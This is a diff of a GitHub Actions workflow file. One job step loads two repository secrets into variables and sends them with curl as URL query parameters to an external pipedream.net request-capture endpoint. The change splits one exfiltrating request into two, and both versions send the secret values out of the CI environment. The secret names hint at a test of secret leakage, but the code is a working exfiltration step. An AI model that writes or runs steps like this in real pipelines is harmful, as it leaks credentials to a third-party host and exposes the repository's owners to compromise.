@@ -16,7 +16,8 @@ jobs:
         run: |
           VAR_ABC=$VALUE
           VAR_XYZ=$VALUE2
-          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC&code=$VAR_XYZ
+          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
+          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_XYZ
         env:
           VALUE: ${{ secrets.PARENT_TEST }}
           VALUE2: ${{ secrets.ORG_SEC }}
